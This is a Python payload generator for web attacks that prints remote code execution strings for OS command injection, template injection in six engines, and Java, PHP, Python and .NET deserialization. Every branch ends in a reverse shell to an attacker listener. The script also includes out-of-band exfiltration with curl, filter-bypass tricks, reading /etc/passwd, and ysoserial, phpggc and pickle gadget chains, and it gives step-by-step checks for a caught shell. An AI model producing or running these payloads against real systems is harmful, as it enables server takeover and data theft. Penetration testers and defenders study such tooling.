#!/usr/bin/env python3
"""DIRECT RCE families -> shell: OS command injection · SSTI · insecure deserialization · code injection.
PRINTS payloads. Edit LHOST/LPORT in _web_common.py.

Usage:
  python3 gen_rce.py cmdi                 # OS command injection (separators, blind/OOB, filter bypass)
  python3 gen_rce.py ssti [--engine jinja2|twig|freemarker|velocity|erb|smarty]   # template injection
  python3 gen_rce.py deserial --lang java|php|python|dotnet     # insecure deserialization
"""
import sys
import _web_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "cmdi"
rev = P.revshell("bash")
# quote-FREE revshell for embedding inside single/double-quoted payloads (SSTI/deserial) — no quote collisions:
rev_nq = P.revshell_nq()
rev_exec = P.revshell_exec()   # for Runtime.exec sinks (java/freemarker/velocity): no shell, no pipes

if arg == "cmdi":
    print("# OS COMMAND INJECTION — needs: a param whose value the app passes to a shell (ping host, filename, export fmt).")
    print("# separators (try each in order): ;  |  ||  &&  `cmd`  $(cmd)  %0a(newline)  \\n")
    print("   ; id     | id     || id     && id     `id`     $(id)     # -> ok: uid=... appears in the response = injectable")
    print("# blind (no output reflected)? confirm out-of-band:")
    print(f"   ; ping -c1 {P.LHOST}     |    ; curl http://{P.LHOST}/`whoami`     # -> ok: your tcpdump/listener/http.server sees the ping or the /whoami GET")
    print("# filter bypass (spaces/keywords) — reach for these only if the plain separators are filtered:")
    print("   ${IFS}   {cat,/etc/passwd}   c\\at   'c'at   $@   or base64-encode the whole command (most reliable through filters):")
    print(f"   ;echo {P.b64(rev)}|base64 -d|bash        # quote/space-safe, nests through most filters")
    print(f"# -> revshell:  ;{rev}    (URL-encoded: ;{P.url(rev)})   catch: nc -lvnp {P.LPORT}  (start it FIRST)")

elif arg == "ssti":
    eng = opt("--engine", "jinja2")
    print(f"# SERVER-SIDE TEMPLATE INJECTION   engine={eng}")
    print("# needs: user input rendered INTO a server-side template (not just reflected as text).")
    print("# detect FIRST (do this before the RCE payload):  {{7*7}} -> 49  ·  ${7*7}  ·  #{7*7}  ·  <%= 7*7 %>")
    print("# -> ok: the page shows 49 (not the literal {{7*7}}); which syntax renders 49 tells you the engine.")
    payloads = {   # rev_nq (base64, no quotes) so it nests inside the template's quotes cleanly
        "jinja2":    "{{ cycler.__init__.__globals__.os.popen('" + rev_nq + "').read() }}",
        "twig":      "{{ ['" + rev_nq + "']|filter('system') }}",
        # freemarker/velocity reach Runtime.exec (NO shell, tokenized on whitespace) -> rev_exec, not rev_nq
        "freemarker":"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"" + rev_exec + "\") }",
        "velocity":  "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))"
                     "#set($e=$rt.getMethod('getRuntime',null).invoke(null,null).exec(\"" + rev_exec + "\"))",
        "erb":       "<%= `" + rev_nq + "` %>",
        "smarty":    "{system('" + rev_nq + "')}",
    }
    print(f"# RCE payload ({eng}) — send in the same field where {{{{7*7}}}} rendered 49:")
    print(payloads.get(eng, payloads["jinja2"]))
    print(f"# -> ok: your nc catches the shell (the payload runs a base64 revshell). catch: nc -lvnp {P.LPORT} (start it FIRST)")
    print(f"# (unknown/unsure engine? try  tplmap -u '<url>'  to auto-detect + exploit.)")

elif arg == "deserial":
    lang = opt("--lang", "java")
    print(f"# INSECURE DESERIALIZATION   lang={lang}")
    print(f"# needs: the app deserializes attacker-controlled bytes (a serialized object in a cookie/param/body).")
    if lang == "java":
        print("# needs: a KNOWN gadget lib on the classpath (CommonsCollections*, Spring, etc.) — the chain must match a present lib.")
        print("# step 1 (do FIRST): blind OOB check the sink is live with the URLDNS gadget, THEN swap to an RCE chain:")
        print(f"java -jar ysoserial.jar CommonsCollections5 '{rev_exec}' | base64          # -> send as the serialized blob  -> ok: your nc catches the shell")
        print("#   deliver via: a Java object param, JSF ViewState, RMI/JMX, T3 (WebLogic), etc.")
    elif lang == "php":
        print("# needs: a param reaching unserialize() AND a framework/lib with a known POP chain present (Laravel/Symfony/Monolog/etc.).")
        print(f"phpggc Monolog/RCE1 system '{rev_nq}'          # -> inject into the unserialize() sink (cookie/param)  -> ok: your nc catches the shell")
        print("#   find the sink: a param passed to unserialize(); __wakeup/__destruct magic methods.")
    elif lang == "python":
        print("# needs: the app pickle.loads() attacker data (pickle/PyYAML unsafe load).")
        print(f"python3 -c \"import pickle,os,base64;print(base64.b64encode(pickle.dumps(type('x',(object,),"
              f"{{'__reduce__':lambda s:(os.system,('{rev_nq}',))}})())))\"     # -> send the b64 blob to the sink  -> ok: your nc catches the shell")
    elif lang == "dotnet":
        print("# needs: a known .NET formatter (BinaryFormatter/Json.NET/etc.) deserializing attacker data.")
        print(f"ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c '{rev_nq}' -o base64     # -> ok: your nc catches the shell")
    else:
        print(f"# unknown --lang '{lang}' (java|php|python|dotnet)"); sys.exit(1)
    print(f"# catch: nc -lvnp {P.LPORT}  (start it FIRST)")
else:
    print("use: cmdi | ssti [--engine ...] | deserial --lang <lang>"); sys.exit(1)
